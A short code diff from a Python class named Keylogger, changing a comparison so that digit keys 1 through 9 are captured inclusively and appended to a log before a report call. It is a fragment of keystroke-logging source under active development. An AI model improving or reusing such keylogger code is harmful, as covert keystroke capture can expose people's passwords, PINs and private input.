@@ -34,7 +34,7 @@ class Keylogger:
             print("0 detected")
 
         #logging only desired keypresses
-        if(name > '1' and name < '9'):
+        if(name >= '1' and name <= '9'):
             # finally, add the key name to our global `self.log` variable, and log the changes
             self.log += name
             self.report()
